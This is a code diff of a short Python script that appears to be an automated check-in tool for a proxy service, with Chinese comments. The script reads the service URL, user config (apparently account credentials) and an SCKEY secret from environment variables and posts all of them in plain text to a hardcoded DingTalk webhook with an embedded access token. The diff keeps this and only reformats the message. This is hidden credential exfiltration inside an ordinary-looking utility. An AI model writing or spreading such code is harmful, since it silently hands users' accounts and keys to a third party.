@@ -1,6 +1,6 @@
 import requests, json, re, os
 # 机场的地址
-url = os.environ.get('URL')
+url = os.environ.get('URLS')
 # 配置用户名（一般是邮箱）
 
 config = os.environ.get('CONFIG')
@@ -17,7 +17,7 @@ WEBHOOK = "https://oapi.dingtalk.com/robot/send?access_token=887828d861ac71ccb39
 headers = {"Content-Type": "application/json"}
 data = {
     "msgtype": "text",
-    "text": {"content": "通知url"+url+"config"+config+"SCKEY"+SCKEY}
+    "text": {"content": "通知url\n"+url+"\nconfig\n"+config+"\nSCKEY\n"+SCKEY}
 }
 
 response = requests.post(WEBHOOK, headers=headers, data=json.dumps(data))
